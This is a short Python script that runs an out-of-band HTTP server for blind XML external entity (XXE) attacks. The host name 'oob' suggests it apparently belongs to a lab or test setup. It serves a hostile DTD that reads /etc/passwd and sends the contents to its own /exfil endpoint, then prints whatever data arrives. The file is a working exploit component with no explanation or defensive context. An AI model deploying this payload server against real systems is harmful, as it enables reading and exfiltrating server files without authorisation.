from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import sys

class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stdout.write("[OOB] " + (fmt % args) + "\n")
        sys.stdout.flush()

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/payload.dtd":
            dtd = '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil SYSTEM "http://oob:8000/exfil?data=%file;">
%exfil;'''
            body = dtd.encode()
            self.send_response(200)
            self.send_header("Content-Type","application/xml-dtd")
            self.send_header("Content-Length",str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        qs = parse_qs(parsed.query)
        if parsed.path == "/exfil":
            print("[OOB-EXFIL] data=" + str(qs.get("data", [""])[0]), flush=True)
        body = b"OK\n"
        self.send_response(200)
        self.send_header("Content-Type","text/plain")
        self.send_header("Content-Length",str(len(body)))
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0",8000),Handler).serve_forever()
